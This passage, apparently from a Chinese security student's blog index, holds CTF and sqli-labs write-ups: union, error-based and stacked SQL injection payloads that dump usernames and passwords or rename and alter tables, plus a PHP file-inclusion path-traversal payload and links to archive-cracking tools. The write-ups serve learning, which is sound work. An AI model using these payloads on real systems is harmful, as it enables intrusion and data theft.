id=(&#39;1&#39;</code>) <code>LIMIT 0,1;</code></strong></p><p>所以可以构造payload:</p><p>?id=0’)语句 %23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/groupconcattables.png" alt></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/concatcolumns.png" alt></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/zhi-1.png" alt></p><p>语句跟前两题一样…这题我只想着id=’input’) LIMIT 0,1,没有想到input前面也应该有个(所以我们要用)来闭合,我竟然想用(来闭合后面的,也试过?id=0)(union select 1,2,3或者是?id=0 union select 1,2,3(…这是因为一开始我觉得)是在LIMIT左边所以要这样来闭合…这也是对代码不够熟悉的问题</p><p>les3[完]</p><h3 id="les4-GET-Error-based-Double-Quotes-String"><a href="#les4-GET-Error-based-Double-Quotes-String" class="headerlink" title="les4:GET-Error based Double Quotes-String"></a>les4:GET-Error based Double Quotes-String</h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/doublequotes.png" alt></p><p>常规操作、单引号操作都正常，回到题目所说的double quotes string，因此来给双引号测试，果然出错，因此猜测语句是这样的: <strong><code>SELECT * FROM users WHERE id=(</code>“input”) <code>LIMIT 0,1;</code></strong></p><p>然后操作跟之前就一样了，<strong>?id=0”) union select 1,2,3%23</strong></p><p>?id=0”)语句 %23</p><p>les4[完]</p><p>les1-les4是union联合查询的题,分别是单引号,无引号,双引号,单引号带括号</p><h3 id="les5-GET-Double-injection-Single-Quotes-String-les4-5WP"><a href="#les5-GET-Double-injection-Single-Quotes-String-les4-5WP" class="headerlink" title="les5:GET-Double injection-Single Quotes-String les4/5WP"></a>les5:GET-Double injection-Single Quotes-String <a href="https://www.jianshu.com/p/b502893dcc81" target="_blank" rel="noopener">les4/5WP</a></h3><p><a href="https://www.jianshu.com/p/8c2343705100" target="_blank" rel="noopener">报错型注入</a><br><img src="https://ocbillhome.files.wordpress.com/2019/07/id1.png" alt></p><p>les5开头也是要输入id=数字，就GET一个id=1，然后就如上图所示，跟前4题好像有点不大一样</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/id1-1.png" alt></p><p>单引号测试，报错，猜测语句为<code>SELECT * FROM users WHERE id=&#39;input</code>‘ <code>LIMIT 0,1;</code></p><p>再看题目：double injection双注入，搜索了一下，有推荐这篇文章：<a href="http://www.2cto.com/article/201303/192718.html?jovova=hvwse3" target="_blank" rel="noopener">详细讲解双查询注入</a></p><p>文章讲到，双注入需要理解以下4个函数：</p><p>①rand()—随机函数—生成一个0到1的随机数</p><p>②floor()—取整函数—取浮点数的整数部分,如2.7123取2</p><p>③count()—汇总(聚合/计数)函数—返回查询对象的总数</p><p>④group by clause—分组语句—按clause对查询结果分组</p><p>select concat((select database()),floor(rand()*2));//如下图所示</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/selectdatabase-2.png" alt></p><p><strong>数据库:</strong></p><p>?id=0’ union select count(*),2,concat(‘*‘,(select database()),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/database-1.png" alt></p><p>然后打算这样爆表名</p><p>?id=0’ union select count(*),2,concat(‘*‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),’*‘,floor(rand()*2))as a from information_schema.tables group by a %23</p><p>发现变成了You are in…… 但是有的dalao的WP明明是这样写的,看来还是要尝试其他姿势</p><p>尝试报错型注入: ?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+ /<em>没错这跟les1的是一样的</em>/</p><p>或者?id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)%23</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/tables-2.png" alt></p><p>然后爆列?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’users’))) –+</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/columns-1.png" alt></p><p>然后爆值?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x26,password) from users)))–+</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/up.png" alt></p><p>再爆值?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (‘Dumb’,’I-kill-you’))))–+</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/up1.png" alt></p><p>好像也可以按延迟型注入来做…但暂时先按报错型注入来做吧</p><p>les5[完]</p><h3 id="les6-GET-Double-injection-Double-Quotes-String"><a href="#les6-GET-Double-injection-Double-Quotes-String" class="headerlink" title="les6:GET-Double injection-Double Quotes-String"></a>les6:GET-Double injection-Double Quotes-String</h3><p>跟les5差不多,只要把单引号变成双引号</p><p>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) –+</p><p>注意extractvalue,是extract,不是extra…</p><p>les6[完]</p>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF记事本</title>
      <link href="/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/"/>
      <url>/2019/07/16/ctfbuuctf-e8-ae-b0-e4-ba-8b-e6-9c-ac/</url>
      
        <content type="html"><![CDATA[<p>—记事本—备忘录—部分题目是查看dalao的WP再摘抄过来的—</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="[Misc]"></a>[Misc]</h2><a id="more"></a><h3 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1.二维码"></a><strong>1.二维码</strong></h3><p>下载文件&gt;kali&gt;binwalk filename&gt;发现有压缩包&gt;binwalk -e filename提取压缩包&gt;解压得到flag</p><h3 id="2-N种解决方法"><a href="#2-N种解决方法" class="headerlink" title="2.N种解决方法"></a><strong>2.N种解决方法</strong></h3><p>直接扔到winhex拉到最后就得到flag</p><h3 id="3-金三胖"><a href="#3-金三胖" class="headerlink" title="3.金三胖"></a><strong>3.金三胖</strong></h3><p>扔到PS看图层显示</p><h3 id="4-LSB隐写"><a href="#4-LSB隐写" class="headerlink" title="4.LSB隐写"></a><strong>4.LSB隐写</strong></h3><p>-LSB全称leastsignificant bit,是一种基于图片最低有效位修改储存信息的隐写方法</p><p>-LSB隐写就是通过修改RGB颜色分量的最低位二进制（LSB）,来进行信息的储存,人眼看不出前后变化</p><p>用stegsolve打开图片后,看到alpha的全位空白,选择analyse&gt;extract preview,把RGB的0给勾上,右侧bit order选择LSB First,选择好后点击下方save bin(以二进制的形式保存),保存为图片格式即可得到二维码,扫一下就得到flag了</p><h3 id="5-镜子里的世界"><a href="#5-镜子里的世界" class="headerlink" title="5.镜子里的世界"></a><strong>5.镜子里的世界</strong></h3><p>这题依然是用stegsolve打开,发现alpha是空白的,选择analyse&gt;extract preview,把RGB的0都勾上,点击preview,上方窗口有一些数据,拉到最上方即可发现flag</p><h3 id="6-rar"><a href="#6-rar" class="headerlink" title="6.rar"></a><strong>6.rar</strong></h3><p>题目告诉我们是4位纯数字,用ARCHPR打开压缩包,选择口令长度为4,范围是所有数字,攻击类型为爆破,很快我们就得到flag</p><h3 id="7-文件中的秘密"><a href="#7-文件中的秘密" class="headerlink" title="7.文件中的秘密"></a><strong>7.文件中的秘密</strong></h3><p>flag真的存在文件中…将文件后缀改为txt打开即可得到flag</p><h3 id="8-看我回旋踢"><a href="#8-看我回旋踢" class="headerlink" title="8.看我回旋踢"></a><strong>8.看我回旋踢</strong></h3><p>这是一道ROT13的题,搜一个rot13编码解码的网页工具就可以了</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考<a href="https://www.qqxiuzi.cn/bianma/ascii.htm" target="_blank" rel="noopener">ASCII编码</a>。</p><h2 id="Web"><a href="#Web" class="headerlink" title="[Web]"></a><strong>[Web]</strong></h2><h3 id="1-WarmUp"><a href="#1-WarmUp" class="headerlink" title="1.WarmUp"></a><strong>1.WarmUp</strong></h3><p>打开后查看源码发现有<!--source.php-->,在url加上/source.php看到</p> <?php    highlight\_file(\_\_FILE__);    class emmm    {        public static function checkFile(&$page)        {            $whitelist = \["source"=>"source.php","hint"=>"hint.php"\];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $\_page = mb\_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in\_array($\_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $\_page = mb\_substr(                $_page,                0,                mb\_strpos($\_page . '?', '?')            );            if (in\_array($\_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST\['file'\])        && is\_string($\_REQUEST\['file'\])        && emmm::checkFile($_REQUEST\['file'\])    ) {        include $_REQUEST\['file'\];        exit;    } else {        echo "<br><img 11 2018 src="\\" https: i.loli.net 01 5bdb0d93dc794.jpg\\"">";    }  ?><ul><li><p>mb_substr — 获取部分字符串(提取$page的第0到第mb_strpos个字符)</p></li><li><p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置(在$page中找出?首次出现的位置)</p></li><li><p>in_array — 检查数组中是否存在某个值($whitelist里面是否有$page)</p></li></ul><p><em>if</em>(<em>ina_​_rray</em>(_page, $whitelist)) {return true;}//这个函数连接上一个函数就是以问号为分割取出前面的字符串来判断是否存在包含的文件名中</p><p>$_page = urldecode($page);把$page进行url解码,因此在构造完payload之后要进行两次url编码</p><p><strong>因此代码大概意思为: checkFile函数$_page取file参数第一个问号之前的字段检查文件名是否在白名单内,然后对$page进行url解码之后再判断一次,当满足request[‘file’]不为空&amp;&amp;request[‘file’]是字符串&amp;&amp;checkfile函数返回true时,包含file文件</strong></p><p>且看见有[“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];</p><p>打开hint.php发现</p><p>flag not here, and flag in ffffllllaaaagggg</p><p>综上得到payload为:</p><p>file=source.php?/../../../../../../ffffllllaaaagggg</p><p>最终URL为<a href="http://web5.buuoj.cn/source.php?file=source.php%253f/../../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://web5.buuoj.cn/source.php?file=source.php%253f/../../../../../../ffffllllaaaagggg</a></p><p>flag{k9oct67wctkmbsdkhi32yiip74vsqlvu}</p><h3 id="2-随便注"><a href="#2-随便注" class="headerlink" title="2.随便注"></a><strong>2.随便注</strong></h3><p><img src="https://ocbillhome.files.wordpress.com/2019/07/1.png" alt></p><p>姿势:1</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/2.png" alt></p><p>姿势:2</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/3.png" alt></p><p>姿势:3</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/1orderby1.png" alt></p><p>姿势:1’ order by 1#</p><p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ order by 1 #‘(按照sql的语法#起注释作用所以#后面的单引号就被注释掉了)</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/1orderby3.png" alt></p><p>姿势:1’ order by3#</p><p><strong>数字等于3报错，说明当前表只有两个字段并且只有2列</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/1or11.png" alt></p><p>姿势:1’ or 1=1#</p><p><strong>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or 1=1 #’</strong></p><p>或者SELECT first_name, last_name FROM users WHERE user_id = ‘1’ or’1’(这是sql万能密码其中之一)但是这题只有在法二的最后一步有用到</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/prag_match.png" alt></p><p><strong>过滤了常用的sql命令</strong></p><p><strong>但是对堆叠注入(一次性执行多个语句)没有任何的检查，并且他这里面是将Mysql查询返回的结果以数组的形式返回，也就是说没有限制回显的多少。 也没有过滤rename</strong></p><p><strong>那么接下来就用show databases;和show tables;来看库和表</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/showdatabases.png" alt></p><p>姿势:1’;show databases;#</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/showtables.png" alt></p><p>姿势:1’;show tables;#</p><p><strong>得到了6个数据库和2个表</strong></p><p><strong>那接下来就show一下表的结构</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/show1919810931114514columns.png" alt></p><p>姿势:1’;show columns from <code>1919810931114514</code>#</p><p><strong>纯数字的表需要用反引号(tab上面1左边esc下面的那个)来括住,可以看到flag在表1919810931114514中</strong></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/showwordscolumns.png" alt></p><p>姿势:1’;show columns from words;#</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/setprepare.png" alt></p><p>尝试存储绕过</p><p><strong>使用strstr和获取的，可以大小写绕过</strong></p><p><strong>看dalao的WP的payload为</strong></p><p>1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</p><p>把a变量的十六进制扔到mysql里unhex一下:</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/unhex.png" alt></p><p>unhex</p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/search1.png" alt></p><p><img src="https://ocbillhome.files.wordpress.com/2019/07/search2.png" alt></p><p>所以<br>0x73656c656374202a2066726f6d20603139313938313039333131313435313460<br>等价于<br>select * from `1919810931114514`</p><p><strong>法二:</strong>把表名改了,再1’ or 1=1#</p><p><strong>因为在php层面查询的时候固定语句一般是 select * from words where id = $id这种，数据库里面的变化php是管不到的,而且上面的过滤也没有过滤rename</strong></p><p>mysql中rename，语法为</p><p>rename table <code>当前表名</code> to <code>改后表名</code>;</p><p>但是表words中是存在列id，查询语句可能会根据该字段进行查询，而装有flag的表里面没有id字段，因此要用alter来添加，语法为</p><p>alter table <code>表名</code> add(字段名 字段类型 NULL)        #可为空</p><p>由于id的类型是int,所以alert可以写成这样子</p><p>alter table `1919810931114514` add(id int NULL)</p><p>最终dalao的payload为:</p><p><code>?inject=&#39;;alter table \</code>1919810931114514` add(id int NULL);rename table `words` to `tmp`;rename table `1919810931114514` to `words`;</p><p>也可以这样改(另一dalao的payload):</p><p>1’;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary:"></a>summary:</h2><p>随便注:SQL注入单号号’闭合,语句一般都是&lt;<strong>SELECT first_name, last_name FROM users WHERE user_id = ‘&gt;</strong>所以可以用’来闭合一下—SQL注入一般步骤我看的是<a href="https://www.cnblogs.com/baimaoma/p/8608490.html" target="_blank" rel="noopener">Mr白猫的blog</a></p><p>WarmUp:审计代码和本地包含,我现在的php水平还需要利用帮助手册才能勉强读懂代码的意思,最后还是看了dalao的WP才知道要目录穿越一下…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CRC32</title>
      <link href="/2019/06/30/toolscrc32/"/>
      <url>/2019/06/30/toolscrc32/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">CRC32</a></p><p>取自GitHub——theonlypwner</p><p>zip的CRC碰撞</p><p>可以这样操作：python crc32.py reverse <strong>0x2f5ead52</strong>(加粗部分为CRC)</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WebDirScan</title>
      <link href="/2019/06/30/toolswebdirscan/"/>
      <url>/2019/06/30/toolswebdirscan/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/TuuuNya/webdirscan" target="_blank" rel="noopener">webdirscan</a></p><p>取自GitHub——TuuuNya</p><p>可以这样操作：py2 webdirscan.py <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PDFChange</title>
      <link href="/2019/06/29/swpdfchange/"/>
      <url>/2019/06/29/swpdfchange/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1_vZNlzYk1UOwpjB2VlinnA" target="_blank" rel="noopener">PDFChange</a><br>提取码：8iai</p><p>取自微信公众号——软件安装管家</p><p>公众号有详细的安装教程</p>]]></content>
      
      
      <categories>
          
          <category> SW </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AndroidPhoneGoogleCAM</title>
      <link href="/2019/06/29/toolsandroidphonegooglecam/"/>
      <url>/2019/06/29/toolsandroidphonegooglecam/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/share/init?surl=aNkgqyTLXfoz1uSNV90j9A" target="_blank" rel="noopener">GCAM</a></p><p>提取码：7777</p><p>取自Weibo——阿狗酱</p><p>建议关注微博，他会不定时更新</p><p>2019.7更新了小米8、mix3、mix2s，6x、PocophoneF1的<a href="https://www.celsoazevedo.com/files/android/google-camera/dev-urikill/#apk1026" target="_blank" rel="noopener">urikill版GCAM</a>，个人觉得效果更好。（标题的超链接也更新了，包括了urikill，也可以urikill版GCAM直达这个版本）</p>]]></content>
      
      
      <categories>
          
          <category> SW </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARCHPR</title>
      <link href="/2019/06/29/toolsarchpr/"/>
      <url>/2019/06/29/toolsarchpr/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1fGGGdT2vxiFDFUyJEkzvLw" target="_blank" rel="noopener">ARCHPR</a>–爆rar的工具</p><p>提取码：nqtv</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
